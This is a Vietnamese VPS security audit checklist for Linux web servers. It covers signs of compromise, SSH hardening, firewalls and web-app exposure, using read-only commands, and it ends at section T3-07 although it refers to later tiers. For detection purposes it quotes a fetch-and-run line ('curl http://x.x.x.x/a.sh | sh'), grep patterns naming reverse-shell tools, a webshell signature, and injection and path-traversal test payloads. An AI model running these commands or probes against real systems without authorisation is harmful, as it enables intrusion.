# VPS SECURITY AUDIT CHECKLIST

**Phiên bản:** 1.0 · **Ngày lập:** 2026-09-13
**Phạm vi:** Audit bảo mật VPS Linux (Ubuntu/Debian/CentOS/RHEL/AlmaLinux) chạy web stack
**Chế độ:** READ-ONLY — toàn bộ lệnh trong tài liệu này chỉ đọc, không ghi, không xoá, không restart service
**Nguyên tắc:** Không triển khai bất kỳ thay đổi nào khi chưa có xác nhận của chủ hệ thống

---

## 0. CÁCH DÙNG TÀI LIỆU NÀY

### 0.1 Quy ước

Mỗi mục kiểm tra có cấu trúc:

| Trường | Ý nghĩa |
|---|---|
| **ID** | Mã định danh để tham chiếu khi báo cáo |
| **Cơ chế** | Kẻ tấn công khai thác như thế nào — không phải định nghĩa lý thuyết |
| **Mức** | CRITICAL / HIGH / MEDIUM / LOW — theo tác động thực tế lên VPS đơn |
| **Lệnh check** | Read-only, copy-paste chạy trực tiếp |
| **Cờ đỏ** | Output như thế nào thì coi là có vấn đề |
| **Khắc phục** | Hướng xử lý — **KHÔNG TỰ ĐỘNG CHẠY**, chờ phê duyệt |

### 0.2 Thứ tự ưu tiên khi audit

```
T8 (đã bị hack chưa?) → T2 (SSH/auth) → T1 (port exposure) → T4 (data layer)
→ T3 (web app) → T5 (privesc) → T7 (CVE mới) → T6 (supply chain) → T9 (recovery)
```

Lý do đảo T8 lên đầu: nếu máy đã bị compromise thì mọi kết quả audit sau đó đều không đáng tin — attacker có thể đã cài rootkit làm sai lệch output của `ps`, `netstat`, `ls`.

### 0.3 Ba mức xác thực kết quả

- **L1 — Tự khai báo:** đọc config file. Nhanh, nhưng config có thể không phải thứ đang chạy.
- **L2 — Runtime:** đọc trạng thái process/kernel đang chạy. Đáng tin hơn.
- **L3 — Ngoài vào:** quét từ máy khác. Đây mới là thứ attacker thực sự thấy.

Chỉ tin L1 khi đã đối chiếu L2. Các mục quan trọng (firewall, port, TLS) bắt buộc có L3.

---

## TIER 8 — ĐÃ BỊ XÂM NHẬP CHƯA? (chạy đầu tiên)

> Đây là tier quan trọng nhất nhưng hay bị bỏ qua. Phần lớn VPS bị hack không được phát hiện vì chủ chỉ đi tìm lỗ hổng mà không tìm dấu vết.

### T8-01 — Tiến trình lạ và cryptominer

**Cơ chế:** Payload phổ biến nhất sau khi RCE thành công trên VPS là cryptominer (XMRig và biến thể). Nó ăn CPU, thường ẩn dưới tên giả như `kdevtmpfsi`, `kinsing`, `[kworker/0:0]`, `sshd` (viết hoa/thường khác), hoặc chạy từ `/tmp`, `/dev/shm`, `/var/tmp`.

**Mức:** CRITICAL

**Lệnh check:**
```bash
# Top CPU consumer
ps aux --sort=-%cpu | head -20

# Tiến trình chạy từ thư mục ghi được — cực kỳ đáng ngờ
ls -l /proc/*/exe 2>/dev/null | grep -E '/tmp|/dev/shm|/var/tmp|\(deleted\)'

# Tên tiến trình khớp IoC miner đã biết
ps aux | grep -iE 'xmrig|kdevtmpfsi|kinsing|minerd|cryptonight|stratum|\.sh$' | grep -v grep

# Tiến trình đang mở kết nối ra ngoài
ss -tunp state established
```

**Cờ đỏ:**
- Bất kỳ binary nào chạy từ `/tmp`, `/dev/shm`, `/var/tmp`
- `(deleted)` trong `/proc/*/exe` — binary đã tự xoá sau khi chạy, kỹ thuật anti-forensic kinh điển
- Kết nối ra port 3333/4444/5555/7777/14444 (mining pool phổ biến)
- CPU 100% liên tục không giải thích được

**Khắc phục:** Nếu xác nhận có miner → coi như toàn bộ máy đã compromise. Không "dọn" mà phải rebuild từ image sạch, restore data sau khi scan. Xoá miner mà không tìm entry point = bị lại trong 48h.

---

### T8-02 — Backdoor SSH qua authorized_keys

**Cơ chế:** Kỹ thuật persistence đơn giản và phổ biến nhất. Attacker thêm public key của mình vào `~/.ssh/authorized_keys` của root hoặc user. Kể cả khi đổi password, họ vẫn vào được. Sống sót qua reboot, qua update.

**Mức:** CRITICAL

**Lệnh check:**
```bash
# Liệt kê TOÀN BỘ authorized_keys trên hệ thống
for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do
  [ -f "$f" ] && echo "=== $f ===" && cat "$f" && stat -c '%y %U %a' "$f"
done

# Tìm authorized_keys ở vị trí bất thường
find / -name 'authorized_keys*' -not -path '/proc/*' 2>/dev/null

# Kiểm tra AuthorizedKeysFile có bị trỏ đi nơi khác không
grep -iE 'AuthorizedKeysFile|AuthorizedKeysCommand' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/* 2>/dev/null
```

**Cờ đỏ:**
- Key mà mày không nhận ra — đối chiếu từng dòng với danh sách key của team
- Comment cuối dòng key lạ (thường là `user@kali`, `root@localhost`, hoặc chuỗi random)
- Timestamp file mới hơn lần cuối mày thao tác
- `AuthorizedKeysFile` trỏ tới path ngoài `~/.ssh/` — ví dụ `/etc/ssh/keys/%u`, dấu hiệu attacker dựng kho key riêng
- `AuthorizedKeysCommand` chỉ tới script lạ

**Khắc phục:** Xoá key không nhận diện được. Nhưng trước khi xoá phải copy ra làm bằng chứng, và phải trả lời: key này vào bằng cách nào? Nếu không trả lời được entry point thì việc xoá chỉ là dọn triệu chứng.

---

### T8-03 — Persistence qua cron, systemd, và init

**Cơ chế:** Sau backdoor SSH, đây là lớp persistence thứ hai. Attacker giấu job ở nơi admin ít nhìn: `/etc/cron.d/`, crontab của user `www-data`, systemd timer, hoặc `@reboot` trong crontab.

**Mức:** CRITICAL

**Lệnh check:**
```bash
# Crontab của mọi user
for u in $(cut -d: -f1 /etc/passwd); do
  echo "=== crontab: $u ==="; crontab -l -u "$u" 2>/dev/null
done

# Cron hệ thống — /etc/cron.d là chỗ hay bị giấu nhất
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ 2>/dev/null
grep -rE 'curl|wget|base64|bash -i|/dev/tcp|python -c|nc ' /etc/cron* /var/spool/cron 2>/dev/null

# systemd unit và timer — persistence hiện đại
systemctl list-timers --all --no-pager
systemctl list-units --type=service --state=running --no-pager
ls -lat /etc/systemd/system/*.service /etc/systemd/system/*.timer 2>/dev/null | head -20

# Unit file sửa gần đây
find /etc/systemd /lib/systemd -name '*.service' -mtime -30 2>/dev/null
```

**Cờ đỏ:**
- Cron job có `curl`/`wget` tải script rồi pipe vào `bash` — pattern `curl http://x.x.x.x/a.sh | sh`
- Chuỗi base64 dài trong cron
- `/dev/tcp/` — reverse shell
- systemd unit có tên na ná service thật (`sshd-helper`, `network-manager`, `systemd-worker`)
- Unit file thời gian sửa không khớp lịch sử vận hành

**Khắc phục:** Ghi lại toàn bộ, đối chiếu với inventory service hợp lệ. Không xoá trước khi có ảnh chụp hệ thống.

---

### T8-04 — Rootkit userland (LD_PRELOAD) và kernel module

**Cơ chế:** `/etc/ld.so.preload` cho phép nạp shared library vào **mọi** process khởi động. Attacker dùng nó để hook `readdir()`, `open()`, làm `ls`/`ps`/`netstat` không thấy file và process của họ. Đây là lý do T8 phải chạy đầu tiên — nếu có rootkit thì kết quả T1-T7 là rác.

**Mức:** CRITICAL

**Lệnh check:**
```bash
# File này bình thường KHÔNG tồn tại trên hệ thống sạch
ls -la /etc/ld.so.preload 2>/dev/null && cat /etc/ld.so.preload

# Biến môi trường LD_PRELOAD của process đang chạy
for p in /proc/[0-9]*; do
  tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -H LD_PRELOAD && echo "  ^ PID: $p"
done 2>/dev/null

# Kernel module không thuộc distro
lsmod | tail -n +2 | awk '{print $1}' | while read m; do
  modinfo "$m" 2>/dev/null | grep -q 'filename.*\/lib\/modules' || echo "MODULE NGOÀI LUỒNG: $m"
done

# So sánh process list giữa ps và /proc — rootkit userland thường quên giấu ở /proc
diff <(ps -eo pid --no-headers | tr -d ' ' | sort -n) \
     <(ls /proc | grep -E '^[0-9]+$' | sort -n) | head -20

# Kiểm tra toàn vẹn binary hệ thống (Debian/Ubuntu)
dpkg --verify 2>/dev/null | grep -v '^$' | head -30
# RHEL/CentOS/Alma
rpm -Va --nomtime --nosize 2>/dev/null | head -30
```

**Cờ đỏ:**
- `/etc/ld.so.preload` tồn tại → giả định compromise cho tới khi chứng minh ngược lại
- Kernel module không map được tới file trong `/lib/modules`
- `diff` giữa `ps` và `/proc` ra khác biệt → có process bị giấu
- `dpkg --verify` báo checksum sai (`5` ở cột đầu) trên binary trong `/bin`, `/usr/bin`, `/sbin` — đặc biệt `ls`, `ps`, `netstat`, `ss`, `find`, `sshd`

**Khắc phục:** Rootkit kernel-level = rebuild máy. Không có cách dọn đáng tin. Chạy `rkhunter`/`chkrootkit` chỉ để tham khảo, không phải kết luận — chúng bỏ sót rootkit hiện đại.

---

### T8-05 — Người dùng và quyền bất thường

**Cơ chế:** Attacker tạo user mới (thường UID 0 để thành root thứ hai), hoặc thêm user hiện có vào nhóm `sudo`/`wheel`/`docker`.

**Mức:** HIGH

**Lệnh check:**
```bash
# Mọi tài khoản UID 0 — chỉ được có root
awk -F: '$3==0 {print "UID 0: " $1}' /etc/passwd

# Tài khoản có shell đăng nhập được
awk -F: '$7 !~ /(nologin|false|sync)$/ {print $1 " → " $7}' /etc/passwd

# Tài khoản không có mật khẩu
awk -F: '$2=="" {print "KHÔNG MẬT KHẨU: " $1}' /etc/shadow 2>/dev/null

# Thành viên nhóm đặc quyền
grep -E '^(sudo|wheel|admin|adm|docker|lxd)' /etc/group

# User tạo gần đây
ls -la --time-style=long-iso /home/
grep -E 'useradd|adduser|usermod|groupmod' /var/log/auth.log* /var/log/secure* 2>/dev/null | tail -30
```

**Cờ đỏ:**
- Nhiều hơn một dòng UID 0
- User trong nhóm `docker` hoặc `lxd` — hai nhóm này tương đương root (xem T5-04)
- Tài khoản service (`www-data`, `nginx`, `mysql`, `postfix`) có shell là `/bin/bash` thay vì `nologin`
- User được tạo vào thời điểm không ai trong team làm việc

---

### T8-06 — Log bị xoá hoặc có khoảng trống

**Cơ chế:** Sau khi vào máy, việc đầu tiên của attacker chuyên nghiệp là xoá dấu vết: truncate `/var/log/auth.log`, xoá `.bash_history`, hoặc symlink history về `/dev/null`.

**Mức:** HIGH

**Lệnh check:**
```bash
# Kích thước và thời gian log — file 0 byte là cờ đỏ
ls -la --time-style=long-iso /var/log/ | head -40

# Khoảng trống thời gian trong auth log
grep -oE '^[A-Z][a-z]{2} [ 0-9]{2}' /var/log/auth.log 2>/dev/null | uniq -c

# History bị vô hiệu hoá
for f in /root/.bash_history /home/*/.bash_history; do
  [ -e "$f" ] && echo "$f → $(stat -c '%s bytes, %y' "$f" 2>/dev/null) $(readlink "$f")"
done
grep -rE 'HISTFILE|HISTSIZE|unset HIST' /root/.bashrc /home/*/.bashrc /etc/profile 2>/dev/null

# Journald có bị xoá không
journalctl --disk-usage 2>/dev/null
journalctl --list-boots --no-pager 2>/dev/null | tail -10
```

**Cờ đỏ:**
- `auth.log` hoặc `secure` = 0 byte
- `.bash_history` là symlink tới `/dev/null`
- `HISTFILE=/dev/null` hoặc `unset HISTFILE` trong bashrc
- Khoảng trống nhiều ngày trong log mà máy vẫn chạy

---

### T8-07 — Kết nối mạng ra ngoài đáng ngờ (C2 beacon)

**Cơ chế:** Malware hiện đại không mở port lắng nghe (dễ bị firewall chặn) mà chủ động kết nối ra server điều khiển — outbound thường không ai chặn.

**Mức:** CRITICAL

**Lệnh check:**
```bash
# Kết nối đang mở kèm tiến trình
ss -tunp

# Chỉ kết nối ra ngoài đã thiết lập
ss -tnp state established '( dport != :80 and dport != :443 )'

# DNS resolver bị đổi — dấu hiệu DNS hijack
cat /etc/resolv.conf
cat /etc/hosts

# Kiểm tra ARP và routing bất thường
ip route show
```

**Cờ đỏ:**
- Kết nối ra IP lạ ở port không chuẩn, duy trì liên tục
- Tiến trình `nginx`/`apache`/`php-fpm` tự mở kết nối ra internet (web server không có lý do gọi ra ngoài trừ khi app làm vậy)
- DNS trỏ về resolver không phải của mày hay nhà cung cấp
- Entry lạ trong `/etc/hosts` (kỹ thuật chặn update antivirus / license check)

---

## TIER 1 — BỀ MẶT TẤN CÔNG MẠNG

### T1-01 — Port đang mở ra internet

**Cơ chế:** Mỗi port mở là một cửa. Lỗi phổ biến nhất trên VPS là bind service vào `0.0.0.0` thay vì `127.0.0.1` — database, Redis, admin panel vô tình phơi ra internet.

**Mức:** CRITICAL

**Lệnh check (L2 — từ trong máy):**
```bash
ss -tulnp
# Lọc riêng những service bind ra mọi interface
ss -tulnp | grep -E '0\.0\.0\.0|\[::\]'
```

**Lệnh check (L3 — từ ngoài vào, chạy trên máy khác):**
```bash
# Quét nhanh 1000 port phổ biến
nmap -sS -Pn --top-ports 1000 -T4 <VPS_IP>

# Quét toàn bộ 65535 port — chậm hơn nhưng đây mới là bức tranh thật
nmap -sS -Pn -p- -T4 <VPS_IP>

# Xác định version service (để đối chiếu CVE ở T7)
nmap -sV -sC -p <danh_sách_port_mở> <VPS_IP>

# Đừng quên UDP — hay bị bỏ sót, và là nguồn DDoS amplification
nmap -sU --top-ports 100 <VPS_IP>
```

**Cờ đỏ:** Bất kỳ port nào sau đây mở ra internet:

| Port | Service | Rủi ro |
|---|---|---|
| 3306 | MySQL/MariaDB | Brute force, dump toàn bộ DB |
| 5432 | PostgreSQL | Như trên |
| 6379 | Redis | **Cực nguy hiểm** — mặc định không auth, RCE qua module load hoặc ghi crontab |
| 27017 | MongoDB | Bản cũ không auth mặc định, ransomware quét tự động |
| 9200/9300 | Elasticsearch | Không auth mặc định, dump index |
| 11211 | Memcached | Không auth + UDP amplification DDoS |
| 5672/15672 | RabbitMQ | guest/guest mặc định |
| 2375/2376 | Docker API | **= root** trên host ngay lập tức |
| 10250 | Kubelet | RCE trong pod |
| 5900+ | VNC | Thường password yếu hoặc không có |
| 3389 | RDP | Brute force, BlueKeep |
| 23 | Telnet | Cleartext, không có lý do gì để mở |
| 21 | FTP | Cleartext credential |
| 25 | SMTP | Open relay → IP vào blacklist |
| 161 | SNMP | Community string `public` → rò rỉ toàn bộ cấu hình |
| 111 | rpcbind | Amplification DDoS |

**Khắc phục:** Mọi service dữ liệu phải bind `127.0.0.1`. Nếu cần truy cập từ xa → SSH tunnel hoặc VPN (WireGuard), không mở port ra internet.

---

### T1-02 — Firewall

**Cơ chế:** Không có firewall nghĩa là mọi service mới cài đều tự động phơi ra internet. Nhiều VPS provider không bật firewall mặc định.

**Mức:** HIGH

**Lệnh check:**
```bash
# UFW (Ubuntu/Debian)
ufw status verbose 2>/dev/null

# firewalld (RHEL/CentOS/Alma)
firewall-cmd --list-all 2>/dev/null

# nftables — lớp nền hiện đại
nft list ruleset 2>/dev/null

# iptables — lớp nền cũ, vẫn cần check vì Docker ghi rules ở đây
iptables -L -n -v --line-numbers
iptables -t nat -L -n -v

# Kiểm tra rules IPv6 — CỰC KỲ HAY BỊ QUÊN
ip6tables -L -n -v
```

**Cờ đỏ:**
- `Status: inactive`
- Default policy `ACCEPT` trên chain INPUT
- **IPv6 không có rules trong khi IPv4 có** — attacker chỉ cần kết nối qua IPv6 là bypass toàn bộ firewall. Đây là lỗi phổ biến và nghiêm trọng.
- Rule `ACCEPT` từ `0.0.0.0/0` tới port quản trị

**Lưu ý Docker:** Docker ghi rules trực tiếp vào iptables chain `DOCKER`, **bypass UFW**. Container publish port `-p 3306:3306` sẽ mở ra internet kể cả khi `ufw deny 3306`. Kiểm tra bằng `iptables -t nat -L DOCKER -n`.

---

### T1-03 — Firewall tầng nhà cung cấp và chống DDoS

**Cơ chế:** VPS đơn không chịu nổi DDoS L3/L4 quá vài Gbps. Nếu IP gốc lộ ra thì mọi lớp bảo vệ CDN (Cloudflare, Bunny) trở nên vô nghĩa vì attacker đánh thẳng vào IP.

**Mức:** MEDIUM (HIGH nếu là site thương mại)

**Lệnh check:**
```bash
# IP thật của server
curl -s ifconfig.me; echo

# Kiểm tra IP gốc có bị lộ qua DNS history không (chạy từ máy ngoài)
dig +short <domain>
dig +short mail.<domain>      # MX record hay làm lộ IP gốc
dig +short ftp.<domain> direct.<domain> cpanel.<domain>

# Nếu dùng Cloudflare, web server có chỉ chấp nhận IP Cloudflare không?
grep -rE 'allow|deny|set_real_ip_from' /etc/nginx/ 2>/dev/null | head -20
```

**Cờ đỏ:**
- Truy cập được `http://<IP_gốc>` trực tiếp và ra đúng site → CDN bị bypass hoàn toàn
- MX record trỏ về cùng IP với web server
- Subdomain cũ (`direct.`, `origin.`, `dev.`, `staging.`) trỏ về IP gốc

**Khắc phục:** Chỉ allow IP range của CDN ở tầng firewall, chặn phần còn lại.

---

## TIER 2 — TRUY CẬP VÀ XÁC THỰC

### T2-01 — Cấu hình SSH

**Cơ chế:** SSH là mục tiêu số một. Bot quét toàn bộ IPv4 liên tục, thử credential phổ biến. Một VPS mới dựng, port 22 mở, sẽ nhận vài nghìn lần thử đăng nhập trong 24h đầu.

**Mức:** CRITICAL

**Lệnh check:**
```bash
# Config thật đang áp dụng (đã merge Include và default) — đây mới là sự thật, không phải file config
sshd -T 2>/dev/null | sort

# Các tham số quan trọng nhất
sshd -T 2>/dev/null | grep -iE '^(permitrootlogin|passwordauthentication|pubkeyauthentication|permitemptypasswords|port|allowusers|allowgroups|maxauthtries|x11forwarding|permittunnel|gatewayports|kbdinteractiveauthentication|challengeresponseauthentication|usepam|logingracetime|clientaliveinterval)'

# File config và các include
cat /etc/ssh/sshd_config
ls -la /etc/ssh/sshd_config.d/ 2>/dev/null && cat /etc/ssh/sshd_config.d/* 2>/dev/null

# Version — để đối chiếu CVE ở T7
ssh -V 2>&1
sshd -V 2>&1 | head -2
```

**Cấu hình chuẩn cần đạt:**

| Tham số | Giá trị an toàn | Giải thích |
|---|---|---|
| `PermitRootLogin` | `no` (hoặc `prohibit-password`) | Root là tài khoản duy nhất bot biết chắc tồn tại |
| `PasswordAuthentication` | `no` | Chỉ dùng key → brute force thành vô nghĩa |
| `PubkeyAuthentication` | `yes` | |
| `PermitEmptyPasswords` | `no` | |
| `MaxAuthTries` | `3` | Giới hạn thử/kết nối |
| `AllowUsers`/`AllowGroups` | có khai báo | Whitelist, không để mặc định mọi user |
| `X11Forwarding` | `no` | Không cần trên server |
| `LoginGraceTime` | `30` hoặc thấp hơn | Giảm cửa sổ cho regreSSHion (CVE-2024-6387) |
| `Port` | ≠ 22 (tuỳ chọn) | Không phải bảo mật thật, chỉ giảm nhiễu log 95% |

**Cờ đỏ:**
- `permitrootlogin yes` **kết hợp** `passwordauthentication yes` → đây là cấu hình dễ bị chiếm quyền nhất, ưu tiên xử lý số 1
- Không có `AllowUsers`/`AllowGroups`
- `PasswordAuthentication no` ở file chính nhưng `yes` trong `sshd_config.d/` — file trong thư mục `.d` **ghi đè**, và `sshd -T` là thứ duy nhất nói đúng

---

### T2-02 — Brute force: bằng chứng và biện pháp chặn

**Cơ chế:** Credential stuffing và brute force phân tán từ botnet. Không có rate limit thì chỉ là vấn đề thời gian.

**Mức:** HIGH

**Lệnh check:**
```bash
# Đếm số lần đăng nhập thất bại
grep -c 'Failed password' /var/log/auth.log 2>/dev/null || \
grep -c 'Failed password' /var/log/secure 2>/dev/null

# Top IP tấn công
grep 'Failed password' /var/log/auth.log 2>/dev/null | \
  grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort | uniq -c | sort -rn | head -20

# Top username bị thử
grep 'Failed password' /var/log/auth.log 2>/dev/null | \
  awk '{for(i=1;i<=NF;i++) if($i=="for") print $(i+1)}' | sort | uniq -c | sort -rn | head -20

# ĐĂNG NHẬP THÀNH CÔNG — quan trọng nhất
grep -E 'Accepted (password|publickey)' /var/log/auth.log 2>/dev/null | tail -50
last -50
lastb -20 2>/dev/null

# fail2ban
fail2ban-client status 2>/dev/null
fail2ban-client status sshd 2>/dev/null
```

**Cờ đỏ:**
- `Accepted password` từ IP nước ngoài không quen → **giả định compromise ngay**, chuyển sang Tier 8
- fail2ban không chạy trong khi có hàng nghìn failed attempt
- `Accepted publickey` cho user mà mày không cấp key

---

### T2-03 — Chính sách mật khẩu và tài khoản

**Mức:** MEDIUM

**Lệnh check:**
```bash
# Thuật toán hash — yescrypt ($y$) hoặc sha512 ($6$) là đạt; $1$ (MD5) là hỏng
awk -F: '{print $1 ": " substr($2,1,4)}' /etc/shadow 2>/dev/null | grep -v '^\w*: [*!]'

# Chính sách độ phức tạp
grep -vE '^\s*#|^\s*$' /etc/security/pwquality.conf 2>/dev/null
grep -E 'PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE|ENCRYPT_METHOD' /etc/login.defs

# PAM
grep -vE '^\s*#|^\s*$' /etc/pam.d/common-password 2>/dev/null
grep -vE '^\s*#|^\s*$' /etc/pam.d/common-auth 2>/dev/null

# Quyền file nhạy cảm
stat -c '%n %a %U:%G' /etc/shadow /etc/passwd /etc/sudoers /etc/gshadow
```

**Cờ đỏ:**
- Hash `$1$` (MD5) — crack được trong vài giờ
- `/etc/shadow` quyền khác `640` hoặc `600`
- Không có module `pam_faillock`/`pam_tally2` (khoá tài khoản sau N lần sai)

---

### T2-04 — MFA cho truy cập quản trị

**Mức:** MEDIUM (HIGH nếu VPS xử lý dữ liệu client ngân hàng/y tế)

**Lệnh check:**
```bash
grep -rE 'pam_google_authenticator|pam_oath|pam_u2f|duo' /etc/pam.d/ 2>/dev/null
sshd -T 2>/dev/null | grep -iE 'authenticationmethods|kbdinteractive'
```

**Đạt chuẩn:** `AuthenticationMethods publickey,keyboard-interactive` — bắt buộc cả key lẫn TOTP.

---

## TIER 3 — LỚP ỨNG DỤNG WEB

### T3-01 — Phiên bản và CVE của web stack

**Mức:** HIGH

**Lệnh check:**
```bash
nginx -v 2>&1; apache2 -v 2>&1 || httpd -v 2>&1
php -v 2>&1 | head -2
mysql --version 2>&1; psql --version 2>&1
node -v 2>&1; python3 -V 2>&1

# Danh sách package có bản vá bảo mật chờ cài
apt list --upgradable 2>/dev/null | grep -i security
# hoặc
yum updateinfo list security 2>/dev/null
dnf updateinfo list --security 2>/dev/null

# Bản vá đã cài lần cuối khi nào
ls -la --time-style=long-iso /var/log/apt/history.log* 2>/dev/null
grep -E '^(Start-Date|Commandline)' /var/log/apt/history.log 2>/dev/null | tail -20
```

**Cờ đỏ:** Bất kỳ bản vá bảo mật nào chờ quá 30 ngày. Với CVE điểm ≥9.0 có exploit công khai thì cửa sổ an toàn là **72 giờ**.

---

### T3-02 — Rò rỉ thông tin qua banner và header

**Cơ chế:** Server tự khai báo phiên bản chính xác → attacker tra CVE tương ứng mà không cần dò.

**Mức:** LOW (nhưng là bước đầu của mọi cuộc tấn công)

**Lệnh check:**
```bash
curl -sI https://<domain> | sed -n '1,25p'
curl -sI http://<VPS_IP>

grep -rE 'server_tokens|expose_php|ServerTokens|ServerSignature' \
  /etc/nginx/ /etc/apache2/ /etc/php/ 2>/dev/null
```

**Cờ đỏ:** Header `Server: nginx/1.18.0 (Ubuntu)`, `X-Powered-By: PHP/7.4.3`, `X-Generator`, `X-AspNet-Version`.

**Khắc phục:** `server_tokens off` (nginx), `ServerTokens Prod` + `ServerSignature Off` (Apache), `expose_php = Off` (PHP).

---

### T3-03 — Security headers

**Mức:** MEDIUM

**Lệnh check:**
```bash
curl -sI https://<domain> | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy'
```

**Cần có:**

| Header | Giá trị | Chặn được gì |
|---|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | SSL stripping, MITM |
| `Content-Security-Policy` | Tuỳ app, tối thiểu `default-src 'self'` | XSS, injection script bên thứ ba |
| `X-Frame-Options` | `SAMEORIGIN` hoặc CSP `frame-ancestors` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Rò rỉ URL nội bộ qua referrer |
| `Permissions-Policy` | Tắt camera/mic/geo nếu không dùng | Lạm dụng API trình duyệt |

---

### T3-04 — File nhạy cảm bị lộ qua web

**Cơ chế:** Lỗi cấu hình phổ biến nhất và tốn kém nhất. Một file `.env` lộ ra = toàn bộ credential DB, API key, SMTP, payment gateway. Bot quét những path này tự động 24/7.

**Mức:** CRITICAL

**Lệnh check (chạy từ ngoài):**
```bash
for p in .env .env.local .env.production .git/config .git/HEAD .svn/entries \
         config.php wp-config.php.bak .htaccess .DS_Store composer.json \
         package-lock.json docker-compose.yml Dockerfile backup.sql db.sql \
         dump.sql .bash_history phpinfo.php info.php test.php adminer.php \
         .aws/credentials id_rsa web.config server-status; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://<domain>/$p")
  [ "$code" = "200" ] && echo "!!! LỘ: /$p ($code)"
done
```

```bash
# Trên máy: tìm file nhạy cảm nằm trong webroot
find /var/www /home/*/public_html /usr/share/nginx -maxdepth 4 \
  \( -name '.env*' -o -name '*.sql' -o -name '*.bak' -o -name '*.old' \
     -o -name '*.zip' -o -name '*.tar.gz' -o -name '.git' -o -name '*.log' \) \
  2>/dev/null

# Quyền file .env
find /var/www -name '.env' -exec stat -c '%n %a %U:%G' {} \; 2>/dev/null
```

**Cờ đỏ:**
- Bất kỳ HTTP 200 nào ở trên
- `.git/` trong webroot → dump được toàn bộ source code và lịch sử commit (kể cả credential đã xoá ở commit sau)
- `.env` quyền `644` hoặc rộng hơn — phải là `600`, owner đúng user chạy app
- File backup `.sql` trong webroot

---

### T3-05 — OWASP Top 10 ở tầng ứng dụng

**Mức:** CRITICAL (tuỳ app)

Không kiểm tra được bằng lệnh hệ thống — cần test ứng dụng. Danh mục bắt buộc rà:

| Loại | Cơ chế | Cách phát hiện |
|---|---|---|
| **SQL Injection** | Input không tham số hoá ghép thẳng vào query | `sqlmap -u '<url>' --batch --level=2` trên môi trường staging |
| **XSS (reflected/stored/DOM)** | Input hiển thị lại không escape | Test payload thủ công + CSP làm lớp phòng thủ 2 |
| **File Upload → RCE** | Upload `.php`/`.phtml` vào thư mục web thực thi được | Kiểm tra whitelist extension + tắt thực thi PHP trong `/uploads` |
| **LFI/Path Traversal** | `../../../etc/passwd` qua tham số file | Test tham số nhận tên file |
| **SSRF** | App fetch URL do user cung cấp → gọi vào metadata nội bộ | Xem T7-03 |
| **IDOR** | Đổi ID trong URL truy cập dữ liệu người khác | Test thủ công với 2 tài khoản |
| **Deserialization** | Dữ liệu serialize từ user được unserialize | Rà `unserialize()`, `pickle.loads()`, Java `readObject()` |
| **SSTI** | Template engine render input người dùng | Payload `{{7*7}}`, `${7*7}` |
| **XXE** | XML parser cho phép external entity | Rà parser XML, tắt DTD |
| **Auth bypass** | Logic phân quyền sai, JWT không verify signature | Xem T7-05 |

**Lệnh check hỗ trợ:**
```bash
# Thư mục upload có thực thi PHP được không — lỗi RCE kinh điển
grep -rE 'location.*upload|php_admin_flag|engine\s*=\s*off' /etc/nginx/ /etc/apache2/ 2>/dev/null

# File PHP nằm trong thư mục upload — CỰC KỲ đáng ngờ
find /var/www -path '*upload*' -name '*.php*' 2>/dev/null
find /var/www -path '*/uploads/*' -o -path '*/media/*' -name '*.ph*' 2>/dev/null | head -20

# Hàm PHP nguy hiểm còn bật
php -i 2>/dev/null | grep -E 'disable_functions|allow_url_fopen|allow_url_include|open_basedir'
```

**Đạt chuẩn PHP:** `disable_functions` nên có `exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source`; `allow_url_include = Off`.

---

### T3-06 — WordPress / CMS

**Cơ chế:** Trên thực tế, phần lớn VPS bị hack không phải vì lỗ hổng kernel mà vì một plugin WordPress lỗi thời. Plugin là bề mặt tấn công lớn nhất của bất kỳ site WP nào.

**Mức:** CRITICAL nếu có chạy WP

**Lệnh check:**
```bash
# Tìm cài đặt WordPress
find / -name 'wp-config.php' -not -path '/proc/*' 2>/dev/null

# Version core, plugin, theme
wp core version --allow-root --path=/var/www/html 2>/dev/null
wp plugin list --allow-root --path=/var/www/html 2>/dev/null
wp theme list --allow-root --path=/var/www/html 2>/dev/null

# Quyền wp-config.php — chứa credential DB
stat -c '%n %a %U:%G' $(find / -name wp-config.php -not -path '/proc/*' 2>/dev/null)

# Webshell trong thư mục WP — pattern phổ biến
grep -rlE 'eval\s*\(\s*(base64_decode|gzinflate|str_rot13|\$_(POST|GET|REQUEST))' \
  /var/www --include='*.php' 2>/dev/null | head -30

# File PHP mới sửa gần đây trong webroot
find /var/www -name '*.php' -mtime -14 -ls 2>/dev/null | head -40

# xmlrpc.php — kênh brute force và DDoS amplification
curl -s -o /dev/null -w '%{http_code}\n' https://<domain>/xmlrpc.php
```

**Cờ đỏ:**
- Plugin/theme có bản cập nhật chờ, đặc biệt plugin đã bị bỏ khỏi repo chính thức
- `eval(base64_decode(...))` trong file PHP — gần như chắc chắn là webshell
- File PHP sửa gần đây mà không ai trong team deploy
- `xmlrpc.php` trả 200 và không được rate limit
- `wp-config.php` quyền `644`
- Không có WAF trước site

---

### T3-07 — TLS/SSL

**Mức:** MEDIUM

**Lệnh check:**
```bash
# Ngày hết hạn chứng chỉ
echo | openssl s_client -connect <domain>:443 -servername <domain> 2>/dev/null | \
  openssl x509 -noout -dates -subject -issuer

# Protocol và cipher đang bật
nmap --script ssl-enum-ciphers -p 443 <domain>

# Test đầy đủ (khuyến nghị)
# https://www.ssllabs.com/ssltest/ — mục tiêu: hạng A trở lên

# Cấu hình
grep -rE 'ssl_protocols|ssl_ciphers|ssl_prefer_server' /etc/nginx/ 2>/dev/null
```

**Cờ đỏ:**
- Còn bật SSLv3, TLS 1.0, TLS 1.1
- Cipher RC4, 3DES, DES, NULL, EXPORT, hoặc bất kỳ cipher nào không có forward secrecy
- Chứng chỉ hết hạn < 15 ngày mà không có auto-renew
- Không redirect HTTP → HTTPS
- Thiếu `ssl_stapling`

